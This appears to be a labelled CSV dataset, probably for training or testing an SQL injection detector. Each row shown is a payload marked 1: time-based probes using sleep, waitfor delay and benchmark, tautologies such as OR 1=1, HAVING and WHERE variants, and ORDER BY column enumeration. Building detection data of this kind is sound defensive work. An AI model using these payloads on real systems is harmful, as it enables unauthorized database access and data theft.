Sentence,Label
sleep(__TIME__)#,1
1 or sleep(__TIME__)#,1
""" or sleep(__TIME__)#",1
' or sleep(__TIME__)#,1
""" or sleep(__TIME__)=""",1
' or sleep(__TIME__)=',1
1) or sleep(__TIME__)#,1
""") or sleep(__TIME__)=""",1
') or sleep(__TIME__)=',1
1)) or sleep(__TIME__)#,1
""")) or sleep(__TIME__)=""",1
')) or sleep(__TIME__)=',1
;waitfor delay '0:0:__TIME__'--,1
);waitfor delay '0:0:__TIME__'--,1
';waitfor delay '0:0:__TIME__'--,1
""";waitfor delay '0:0:__TIME__'--",1
');waitfor delay '0:0:__TIME__'--,1
""");waitfor delay '0:0:__TIME__'--",1
));waitfor delay '0:0:__TIME__'--,1
'));waitfor delay '0:0:__TIME__'--,1
"""));waitfor delay '0:0:__TIME__'--",1
"benchmark(10000000,MD5(1))#",1
"1 or benchmark(10000000,MD5(1))#",1
""" or benchmark(10000000,MD5(1))#",1
"' or benchmark(10000000,MD5(1))#",1
"1) or benchmark(10000000,MD5(1))#",1
""") or benchmark(10000000,MD5(1))#",1
"') or benchmark(10000000,MD5(1))#",1
"1)) or benchmark(10000000,MD5(1))#",1
""")) or benchmark(10000000,MD5(1))#",1
"')) or benchmark(10000000,MD5(1))#",1
OR 1=1,1
OR 1=0,1
OR x=x,1
OR x=y,1
OR 1=1#,1
OR 1=0#,1
OR x=x#,1
OR x=y#,1
OR 1=1--,1
OR 1=0--,1
OR x=x--,1
OR x=y--,1
OR 3409=3409 AND ('pytW' LIKE 'pytW,1
OR 3409=3409 AND ('pytW' LIKE 'pytY,1
HAVING 1=1,1
HAVING 1=0,1
HAVING 1=1#,1
HAVING 1=0#,1
HAVING 1=1--,1
HAVING 1=0--,1
AND 1=1,1
AND 1=0,1
AND 1=1--,1
AND 1=0--,1
AND 1=1#,1
AND 1=0#,1
AND 1=1 AND '%'=',1
AND 1=0 AND '%'=',1
AND 1083=1083 AND (1427=1427,1
AND 7506=9091 AND (5913=5913,1
AND 1083=1083 AND ('1427=1427,1
AND 7506=9091 AND ('5913=5913,1
AND 7300=7300 AND 'pKlZ'='pKlZ,1
AND 7300=7300 AND 'pKlZ'='pKlY,1
AND 7300=7300 AND ('pKlZ'='pKlZ,1
AND 7300=7300 AND ('pKlZ'='pKlY,1
AS INJECTX WHERE 1=1 AND 1=1,1
AS INJECTX WHERE 1=1 AND 1=0,1
AS INJECTX WHERE 1=1 AND 1=1#,1
AS INJECTX WHERE 1=1 AND 1=0#,1
AS INJECTX WHERE 1=1 AND 1=1--,1
AS INJECTX WHERE 1=1 AND 1=0--,1
WHERE 1=1 AND 1=1,1
WHERE 1=1 AND 1=0,1
WHERE 1=1 AND 1=1#,1
WHERE 1=1 AND 1=0#,1
WHERE 1=1 AND 1=1--,1
WHERE 1=1 AND 1=0--,1
ORDER BY 1--,1
ORDER BY 2--,1
ORDER BY 3--,1
ORDER BY 4--,1
ORDER BY 5--,1
ORDER BY 6--,1
ORDER BY 7--,1
ORDER BY 8--,1
ORDER BY 9--,1
ORDER BY 10--,1
ORDER BY 11--,1
ORDER BY 12--,1
ORDER BY 13--,1
ORDER BY 14--,1
ORDER BY 15--,1
ORDER BY 16--,1
ORDER BY 17--,1
ORDER BY 18--,1
ORDER BY 19--,1
ORDER BY 20--,1
ORDER BY 21--,1
ORDER BY 22--,1
ORDER BY 23--,1
ORDER BY 24--,1
ORDER BY 25--,1
ORDER BY 26--,1
ORDER BY 27--,1
ORDER BY 28--,1
ORDER BY 29--,1
ORDER BY 30--,1
ORDER BY 31337--,1
ORDER BY 1#,1
ORDER BY 2#,1
